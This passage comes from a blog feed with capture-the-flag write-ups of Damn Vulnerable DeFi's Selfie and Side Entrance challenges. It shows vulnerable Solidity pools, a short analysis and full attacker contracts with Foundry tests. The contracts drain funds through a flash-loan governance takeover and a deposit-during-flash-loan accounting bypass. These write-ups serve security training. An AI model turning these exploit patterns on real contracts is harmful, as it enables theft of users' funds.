class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface ISimpleGovernance &#123;</span><br><span class="line">    struct GovernanceAction &#123;</span><br><span class="line">        uint128 value;</span><br><span class="line">        uint64 proposedAt;</span><br><span class="line">        uint64 executedAt;</span><br><span class="line">        address target;</span><br><span class="line">        bytes data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    error NotEnoughVotes(address who);</span><br><span class="line">    error CannotExecute(uint256 actionId);</span><br><span class="line">    error InvalidTarget();</span><br><span class="line">    error TargetMustHaveCode();</span><br><span class="line">    error ActionFailed(uint256 actionId);</span><br><span class="line"></span><br><span class="line">    event ActionQueued(uint256 actionId, address indexed caller);</span><br><span class="line">    event ActionExecuted(uint256 actionId, address indexed caller);</span><br><span class="line"></span><br><span class="line">    function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId);</span><br><span class="line"></span><br><span class="line">    function executeAction(uint256 actionId) external payable returns (bytes memory returndata);</span><br><span class="line"></span><br><span class="line">    function getActionDelay() external view returns (uint256 delay);</span><br><span class="line"></span><br><span class="line">    function getGovernanceToken() external view returns (address token);</span><br><span class="line"></span><br><span class="line">    function getAction(uint256 actionId) external view returns (GovernanceAction memory action);</span><br><span class="line"></span><br><span class="line">    function getActionCounter() external view returns (uint256);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></details><p><code>SimpleGovernance.sol</code>:</p><details><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;../DamnValuableTokenSnapshot.sol&quot;;</span><br><span class="line">import &quot;./ISimpleGovernance.sol&quot;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title SimpleGovernance</span><br><span class="line"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="line"> */</span><br><span class="line">contract SimpleGovernance is ISimpleGovernance &#123;</span><br><span class="line">    uint256 private constant ACTION_DELAY_IN_SECONDS = 2 days;</span><br><span class="line">    DamnValuableTokenSnapshot private _governanceToken;</span><br><span class="line">    uint256 private _actionCounter;</span><br><span class="line">    mapping(uint256 =&gt; GovernanceAction) private _actions;</span><br><span class="line"></span><br><span class="line">    constructor(address governanceToken) &#123;</span><br><span class="line">        _governanceToken = DamnValuableTokenSnapshot(governanceToken);</span><br><span class="line">        _actionCounter = 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function queueAction(address target, uint128 value, bytes calldata data) external returns (uint256 actionId) &#123;</span><br><span class="line">        if (!_hasEnoughVotes(msg.sender)) revert NotEnoughVotes(msg.sender);</span><br><span class="line"></span><br><span class="line">        if (target == address(this)) revert InvalidTarget();</span><br><span class="line"></span><br><span class="line">        if (data.length &gt; 0 &amp;&amp; target.code.length == 0) &#123;</span><br><span class="line">            revert TargetMustHaveCode();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        actionId = _actionCounter;</span><br><span class="line"></span><br><span class="line">        _actions[actionId] = GovernanceAction(&#123;</span><br><span class="line">            target: target,</span><br><span class="line">            value: value,</span><br><span class="line">            proposedAt: uint64(block.timestamp),</span><br><span class="line">            executedAt: 0,</span><br><span class="line">            data: data</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        unchecked &#123;</span><br><span class="line">            _actionCounter++;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        emit ActionQueued(actionId, msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function executeAction(uint256 actionId) external payable returns (bytes memory) &#123;</span><br><span class="line">        if (!_canBeExecuted(actionId)) revert CannotExecute(actionId);</span><br><span class="line"></span><br><span class="line">        GovernanceAction storage actionToExecute = _actions[actionId];</span><br><span class="line">        actionToExecute.executedAt = uint64(block.timestamp);</span><br><span class="line"></span><br><span class="line">        emit ActionExecuted(actionId, msg.sender);</span><br><span class="line"></span><br><span class="line">        (bool success, bytes memory returndata) =</span><br><span class="line">            actionToExecute.target.call&#123;value: actionToExecute.value&#125;(actionToExecute.data);</span><br><span class="line">        if (!success) &#123;</span><br><span class="line">            if (returndata.length &gt; 0) &#123;</span><br><span class="line">                assembly &#123;</span><br><span class="line">                    revert(add(0x20, returndata), mload(returndata))</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                revert ActionFailed(actionId);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return returndata;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getActionDelay() external pure returns (uint256) &#123;</span><br><span class="line">        return ACTION_DELAY_IN_SECONDS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getGovernanceToken() external view returns (address) &#123;</span><br><span class="line">        return address(_governanceToken);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getAction(uint256 actionId) external view returns (GovernanceAction memory) &#123;</span><br><span class="line">        return _actions[actionId];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getActionCounter() external view returns (uint256) &#123;</span><br><span class="line">        return _actionCounter;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /**</span><br><span class="line">     * @dev an action can only be executed if:</span><br><span class="line">     * 1) it&#x27;s never been executed before and</span><br><span class="line">     * 2) enough time has passed since it was first proposed</span><br><span class="line">     */</span><br><span class="line">    function _canBeExecuted(uint256 actionId) private view returns (bool) &#123;</span><br><span class="line">        GovernanceAction memory actionToExecute = _actions[actionId];</span><br><span class="line"></span><br><span class="line">        if (actionToExecute.proposedAt == 0) &#123;</span><br><span class="line">            // early exit</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        uint64 timeDelta;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            timeDelta = uint64(block.timestamp) - actionToExecute.proposedAt;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return actionToExecute.executedAt == 0 &amp;&amp; timeDelta &gt;= ACTION_DELAY_IN_SECONDS;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _hasEnoughVotes(address who) private view returns (bool) &#123;</span><br><span class="line">        uint256 balance = _governanceToken.getBalanceAtLastSnapshot(who);</span><br><span class="line">        uint256 halfTotalSupply = _governanceToken.getTotalSupplyAtLastSnapshot() / 2;</span><br><span class="line">        return balance &gt; halfTotalSupply;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></details><h2 id="Observation"><a href="#Observation" class="headerlink" title="Observation"></a>Observation</h2><ul><li><code>SimpleGovernance</code>: 治理合约，实现了ISimpleGovernance接口，可以预先设置action，在两天后执行。</li><li><code>SelfiePool</code>:闪电贷，包括Snapshot和SimpleGovernance两种token。</li></ul><h2 id="Vuln"><a href="#Vuln" class="headerlink" title="Vuln"></a>Vuln</h2><ul><li>SelfiePool::emergencyExit<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function emergencyExit(address receiver) external onlyGovernance &#123;</span><br><span class="line">        uint256 amount = token.balanceOf(address(this));</span><br><span class="line">        token.transfer(receiver, amount);</span><br><span class="line"></span><br><span class="line">        emit FundsDrained(receiver, amount);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>为了调用emergencyExit，得先成为<code>onlyGovernance</code>.<br>通过<code>SimpleGovernance::_hasEnoughVotes</code><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function _hasEnoughVotes(address who) private view returns (bool) &#123;</span><br><span class="line">        uint256 balance = _governanceToken.getBalanceAtLastSnapshot(who);</span><br><span class="line">        uint256 halfTotalSupply = _governanceToken.getTotalSupplyAtLastSnapshot() / 2;</span><br><span class="line">        return balance &gt; halfTotalSupply;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>得使<code>balance &gt; halfTotalSupply;</code>,所以我们要用闪电贷。<br>同时<code>SimpleGovernance::queueAction</code>要求一定要是合约调用<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if (data.length &gt; 0 &amp;&amp; target.code.length == 0) &#123;</span><br><span class="line"></span><br><span class="line">revert TargetMustHaveCode();</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.13;</span><br><span class="line"></span><br><span class="line">import &#123;SelfiePool, SimpleGovernance, DamnValuableTokenSnapshot&#125; from &quot;./SelfiePool.sol&quot;;</span><br><span class="line">import &quot;../../lib/openzeppelin-contracts/contracts/interfaces/IERC3156FlashBorrower.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract SelfiePoolAttacker is IERC3156FlashBorrower &#123;</span><br><span class="line">    SelfiePool pool;</span><br><span class="line">    SimpleGovernance governance;</span><br><span class="line">    DamnValuableTokenSnapshot token;</span><br><span class="line">    address owner;</span><br><span class="line">    uint256 actionId;</span><br><span class="line"></span><br><span class="line">    constructor(address _pool, address _governance, address _token) &#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        pool = SelfiePool(_pool);</span><br><span class="line">        governance = SimpleGovernance(_governance);</span><br><span class="line">        token = DamnValuableTokenSnapshot(_token);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack(uint256 amount) public &#123;</span><br><span class="line">        // call flashloan</span><br><span class="line">        pool.flashLoan(IERC3156FlashBorrower(this), address(token), amount, &quot;0x&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function onFlashLoan(address initiator, address _token, uint256 amount, uint256 fee, bytes calldata data)</span><br><span class="line">        external</span><br><span class="line">        returns (bytes32)</span><br><span class="line">    &#123;</span><br><span class="line">        // queue action</span><br><span class="line">        token.snapshot();</span><br><span class="line">        actionId = governance.queueAction(address(pool), 0, abi.encodeWithSignature(&quot;emergencyExit(address)&quot;, owner));</span><br><span class="line">        token.approve(address(pool), amount);</span><br><span class="line">        return keccak256(&quot;ERC3156FlashBorrower.onFlashLoan&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function executeAction() public &#123;</span><br><span class="line">        governance.executeAction(actionId);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>SelfiTest.t.sol：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &quot;../../src/6-selfie/ISimpleGovernance.sol&quot;;</span><br><span class="line">import &quot;../../src/6-selfie/SimpleGovernance.sol&quot;;</span><br><span class="line">import &quot;../../src/6-selfie/SelfiePool.sol&quot;;</span><br><span class="line">import &quot;../../src/DamnValuableTokenSnapshot.sol&quot;;</span><br><span class="line">import &quot;../../src/6-selfie/SelfirAttack.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract SelfirTest is Test &#123;</span><br><span class="line">    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;</span><br><span class="line">    uint256 constant TOKENS_IN_POOL = 1_500_000e18;</span><br><span class="line"></span><br><span class="line">    SelfiePool public pool;</span><br><span class="line">    SimpleGovernance public governance;</span><br><span class="line">    DamnValuableTokenSnapshot public dvttoken;</span><br><span class="line"></span><br><span class="line">    address player;</span><br><span class="line">    address deployer;</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        dvttoken = new DamnValuableTokenSnapshot(TOKEN_INITIAL_SUPPLY);</span><br><span class="line">        governance = new SimpleGovernance(address(dvttoken));</span><br><span class="line">        pool = new SelfiePool(address(dvttoken), address(governance));</span><br><span class="line">        dvttoken.transfer(address(pool), TOKENS_IN_POOL);</span><br><span class="line">        dvttoken.snapshot();</span><br><span class="line">        //attacker = new SelfiePoolAttacker(address(pool), address(governance), address(dvttoken));</span><br><span class="line">        player = makeAddr(&quot;player&quot;);</span><br><span class="line">        deployer = makeAddr(&quot;deployer&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testSetupIsdown() public &#123;</span><br><span class="line">        assertEq(governance.getActionCounter(), 1);</span><br><span class="line"></span><br><span class="line">        assertEq(dvttoken.balanceOf(address(pool)), TOKENS_IN_POOL);</span><br><span class="line">        assertEq(pool.maxFlashLoan(address(dvttoken)), TOKENS_IN_POOL);</span><br><span class="line">        assertEq(pool.flashFee(address(dvttoken), 0), 0);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testExploit() public &#123;</span><br><span class="line">        /**</span><br><span class="line">         * CODE YOUR SOLUTION HERE*</span><br><span class="line">         */</span><br><span class="line">        vm.startPrank(player);</span><br><span class="line">        SelfiePoolAttacker attacker = new SelfiePoolAttacker(address(pool), address(governance), address(dvttoken));</span><br><span class="line">        attacker.attack(TOKENS_IN_POOL);</span><br><span class="line">        vm.warp(block.timestamp + 2 days);</span><br><span class="line">        attacker.executeAction();</span><br><span class="line">        vm.stopPrank();</span><br><span class="line">        validation();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function validation() public &#123;</span><br><span class="line">        assertEq(dvttoken.balanceOf(address(player)), TOKENS_IN_POOL);</span><br><span class="line">        assertEq(dvttoken.balanceOf(address(pool)), 0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> DamnVulnerableDefi </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DamnVulnerableDeFi-5</title>
      <link href="/2023/12/29/DamnVulnerableDeFi-5/"/>
      <url>/2023/12/29/DamnVulnerableDeFi-5/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> DamnVulnerableDefi </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DamnVulnerableDeFi-4</title>
      <link href="/2023/12/29/DamnVulnerableDeFi-4/"/>
      <url>/2023/12/29/DamnVulnerableDeFi-4/</url>
      
        <content type="html"><![CDATA[<h1 id="Side-Entrance"><a href="#Side-Entrance" class="headerlink" title="Side Entrance"></a>Side Entrance</h1><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A surprisingly simple pool allows anyone to deposit ETH, and withdraw it at any point in time.</span><br><span class="line"></span><br><span class="line">It has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.</span><br><span class="line"></span><br><span class="line">Starting with 1 ETH in balance, pass the challenge by taking all ETH from the pool.</span><br></pre></td></tr></table></figure><h2 id="Code"><a href="#Code" class="headerlink" title="Code"></a>Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;solady/src/utils/SafeTransferLib.sol&quot;;</span><br><span class="line"></span><br><span class="line">interface IFlashLoanEtherReceiver &#123;</span><br><span class="line">    function execute() external payable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @title SideEntranceLenderPool</span><br><span class="line"> * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)</span><br><span class="line"> */</span><br><span class="line">contract SideEntranceLenderPool &#123;</span><br><span class="line">    mapping(address =&gt; uint256) private balances;</span><br><span class="line"></span><br><span class="line">    error RepayFailed();</span><br><span class="line"></span><br><span class="line">    event Deposit(address indexed who, uint256 amount);</span><br><span class="line">    event Withdraw(address indexed who, uint256 amount);</span><br><span class="line"></span><br><span class="line">    function deposit() external payable &#123;</span><br><span class="line">        unchecked &#123;</span><br><span class="line">            balances[msg.sender] += msg.value;</span><br><span class="line">        &#125;</span><br><span class="line">        emit Deposit(msg.sender, msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() external &#123;</span><br><span class="line">        uint256 amount = balances[msg.sender];</span><br><span class="line">        </span><br><span class="line">        delete balances[msg.sender];</span><br><span class="line">        emit Withdraw(msg.sender, amount);</span><br><span class="line"></span><br><span class="line">        SafeTransferLib.safeTransferETH(msg.sender, amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function flashLoan(uint256 amount) external &#123;</span><br><span class="line">        uint256 balanceBefore = address(this).balance;</span><br><span class="line"></span><br><span class="line">        IFlashLoanEtherReceiver(msg.sender).execute&#123;value: amount&#125;();</span><br><span class="line"></span><br><span class="line">        if (address(this).balance &lt; balanceBefore)</span><br><span class="line">            revert RepayFailed();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Observation"><a href="#Observation" class="headerlink" title="Observation"></a>Observation</h2><p>The contract realize a lender pool , and have a free flashloan, one interface.</p><p>There are there function:<code>deposit()</code>,<code>withdraw()</code>,<code>flashloan()</code>.</p><p>The Vuln is in flashloan function:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function flashLoan(uint256 amount) external &#123;</span><br><span class="line">uint256 balanceBefore = address(this).balance;</span><br><span class="line"></span><br><span class="line">IFlashLoanEtherReceiver(msg.sender).execute&#123;value: amount&#125;();</span><br><span class="line"></span><br><span class="line">if (address(this).balance &lt; balanceBefore) revert RepayFailed();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>especially<code>if (address(this).balance &lt; balanceBefore) revert RepayFailed();</code><br>it only check the contract.balance !!! </p><p>so if we use flashloan first , then we deposit it to the contract . The balanceof(pool) didn’t change . we Pass the check !!!</p><p>after all , we can call withdraw() to make balanace become zero.</p><h2 id="Attack"><a href="#Attack" class="headerlink" title="Attack"></a>Attack</h2><p><code>Exp.sol</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line">import &quot;./SideEntranceLenderPool.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract Exp &#123;</span><br><span class="line">    SideEntranceLenderPool pool;</span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    constructor(address _pool) &#123;</span><br><span class="line">        pool = SideEntranceLenderPool(_pool);</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;</span><br><span class="line">        payable(owner).transfer(msg.value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack(uint256 amount) external payable &#123;</span><br><span class="line">        pool.flashLoan(amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function execute() external payable &#123;</span><br><span class="line">        uint256 value = msg.value;</span><br><span class="line">        // deposit</span><br><span class="line">        pool.deposit&#123;value: value&#125;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() external &#123;</span><br><span class="line">        pool.withdraw();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getOwner() public view returns (address) &#123;</span><br><span class="line">        return owner;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Attack.t.sol</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &quot;../../lib/forge-std/src/Test.sol&quot;;</span><br><span class="line">import &quot;../../src/4-side-entrance/Attacker.sol&quot;;</span><br><span class="line">import &quot;../../src/4-side-entrance/SideEntranceLenderPool.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract SideTest is Test &#123;</span><br><span class="line">    SideEntranceLenderPool pool;</span><br><span class="line">    Exp exp;</span><br><span class="line">    address attacker;</span><br><span class="line">    uint256 internal constant INITIAL_Value = 1000e18;</span><br><span class="line">    uint256 internal constant INITIAL_HACKER_BALANCE = 1e18;</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        pool = new SideEntranceLenderPool();</span><br><span class="line">        vm.deal(address(pool), INITIAL_Value);</span><br><span class="line">        vm.deal(attacker, INITIAL_HACKER_BALANCE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testValue() public &#123;</span><br><span class="line">        console.log(&quot;pool balance: &quot;, address(pool).balance);</span><br><span class="line">        console.log(&quot;attacker balance: &quot;, address(attacker).balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function testOwner() public 